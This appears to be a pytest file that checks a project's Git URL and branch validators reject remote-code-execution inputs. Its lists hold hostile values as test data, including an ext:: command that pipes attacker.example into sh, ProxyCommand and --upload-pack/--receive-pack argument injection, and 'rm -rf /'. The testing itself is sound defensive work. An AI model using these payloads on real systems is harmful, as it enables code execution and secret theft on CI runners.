# Copyright (c) 2026 Valaris Studio
# SPDX-License-Identifier: AGPL-3.0-or-later

"""Git repo URL / branch validation — the `ext::` RCE class.

`git clone ext::sh -c '...'` executes the command on the runner host, so an
unvalidated `url` field is remote code execution with the runner's secrets.
Option-like branch names (`--upload-pack=...`) are the same bug via fetch/checkout
argument injection.
"""

import uuid

import pytest
from pydantic import ValidationError

from app.schemas.git.git_repo import GitRepoCreate, GitRepoUpdate


BASE = {"name": "api", "provider": "github"}


RCE_URLS = [
    "ext::sh -c 'curl attacker.example|sh'",
    "EXT::sh -c whoami",
    "fd::7/foo",
    "--upload-pack=touch /tmp/pwned",
    "-u attacker",
    "file:///etc/passwd",
    "javascript:alert(1)",
    "not a url at all",
    "",
    # A `-`-leading host reaches the ssh binary as an option: `-oProxyCommand=`
    # runs the command. Same class as ext::, one layer down.
    "ssh://-oProxyCommand=id@host/repo",
    "ssh://-x/repo",
    "git@-oProxyCommand=id:repo",
    # Empty authority — the path becomes a local-file read.
    "https:///etc/passwd",
    "https://",
]


ACCEPTED_URLS = [
    "https://github.com/valaris/api",
    "https://github.com/valaris/api.git",
    "http://gitea.internal.example/team/repo.git",
    "ssh://git@github.com/valaris/api.git",
    "git://git.example.com/repo.git",
    "git@github.com:valaris/api.git",
]


@pytest.mark.parametrize("url", RCE_URLS)
def test_create_rejects_dangerous_url(url: str):
    with pytest.raises(ValidationError):
        GitRepoCreate(**BASE, url=url)


@pytest.mark.parametrize("url", ACCEPTED_URLS)
def test_create_accepts_normal_url(url: str):
    assert GitRepoCreate(**BASE, url=url).url == url


@pytest.mark.parametrize("url", RCE_URLS)
def test_update_rejects_dangerous_url(url: str):
    with pytest.raises(ValidationError):
        GitRepoUpdate(url=url)


def test_update_allows_omitted_url():
    assert GitRepoUpdate(name="renamed").url is None


BAD_BRANCHES = [
    "--upload-pack=touch /tmp/pwned",
    "-x",
    "main;rm -rf /",
    "main branch",
    "main..other",
    "refs/heads/main^{}",
    "main~1",
    "back\\slash",
    "",
]


GOOD_BRANCHES = ["main", "master", "develop", "release/1.2.3", "feature/AB-123_fix", "v1.0.0"]


@pytest.mark.parametrize("branch", BAD_BRANCHES)
def test_create_rejects_dangerous_default_branch(branch: str):
    with pytest.raises(ValidationError):
        GitRepoCreate(**BASE, url="https://github.com/valaris/api", default_branch=branch)


@pytest.mark.parametrize("branch", BAD_BRANCHES)
def test_create_rejects_dangerous_integration_branch(branch: str):
    with pytest.raises(ValidationError):
        GitRepoCreate(**BASE, url="https://github.com/valaris/api", integration_branch=branch)


@pytest.mark.parametrize("branch", GOOD_BRANCHES)
def test_create_accepts_normal_branch(branch: str):
    repo = GitRepoCreate(
        **BASE,
        url="https://github.com/valaris/api",
        default_branch=branch,
        integration_branch=branch,
    )
    assert repo.default_branch == branch
    assert repo.integration_branch == branch


@pytest.mark.parametrize("branch", BAD_BRANCHES)
def test_update_rejects_dangerous_branches(branch: str):
    with pytest.raises(ValidationError):
        GitRepoUpdate(default_branch=branch)
    with pytest.raises(ValidationError):
        GitRepoUpdate(integration_branch=branch)


def test_integration_branch_may_be_null():
    repo = GitRepoCreate(**BASE, url="https://github.com/valaris/api", integration_branch=None)
    assert repo.integration_branch is None


# ---------------------------------------------------------------------------
# The merge-queue enqueue payload is a second ingress for branch names: its
# values take precedence over the repo's own and reach `git push`/`git merge`
# as bare argv, where `--receive-pack=cmd` makes git spawn `/bin/sh -c cmd`.
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("branch", BAD_BRANCHES + ["--receive-pack=/bin/echo pwned"])
def test_enqueue_rejects_dangerous_pr_branch(branch: str):
    from app.schemas.merge_queue import MergeQueueEnqueueRequest

    with pytest.raises(ValidationError):
        MergeQueueEnqueueRequest(
            card_id=uuid.uuid4(),
            repo_id=uuid.uuid4(),
            pr_url="https://github.com/a/b/pull/1",
            pr_branch=branch,
        )


@pytest.mark.parametrize("branch", BAD_BRANCHES + ["--receive-pack=/bin/echo pwned"])
def test_enqueue_rejects_dangerous_integration_branch(branch: str):
    from app.schemas.merge_queue import MergeQueueEnqueueRequest

    with pytest.raises(ValidationError):
        MergeQueueEnqueueRequest(
            card_id=uuid.uuid4(),
            repo_id=uuid.uuid4(),
            pr_url="https://github.com/a/b/pull/1",
            pr_branch="feat/x",
            integration_branch=branch,
        )


def test_enqueue_accepts_normal_branches():
    from app.schemas.merge_queue import MergeQueueEnqueueRequest

    payload = MergeQueueEnqueueRequest(
        card_id=uuid.uuid4(),
        repo_id=uuid.uuid4(),
        pr_url="https://github.com/a/b/pull/1",
        pr_branch="feat/AB-1_fix",
        integration_branch="main",
    )
    assert payload.pr_branch == "feat/AB-1_fix"
    assert payload.integration_branch == "main"
